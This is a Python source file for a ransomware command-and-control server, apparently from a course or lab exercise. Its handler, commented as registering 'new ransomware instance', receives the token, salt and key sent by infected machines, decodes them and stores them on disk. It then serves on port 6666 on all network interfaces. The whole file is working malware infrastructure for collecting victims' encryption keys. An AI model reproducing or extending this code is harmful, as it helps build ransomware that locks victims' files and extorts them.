import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance

        token = body["token"]
        salt = body["salt"]
        key = body["key"]

        print(f"Token importé : {token}, type de données : {type(token)}")
        print(f"Salt importé : {salt}, type de données : {type(salt)}")
        print(f"Clé importée : {key}, type de données : {type(key)}")

        #self.save_b64(token, path, "token.bin")
        self.save_b64(salt, "salt.bin")
        self.save_b64(key, "key.bin")    

        return {"status" : "OK"}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()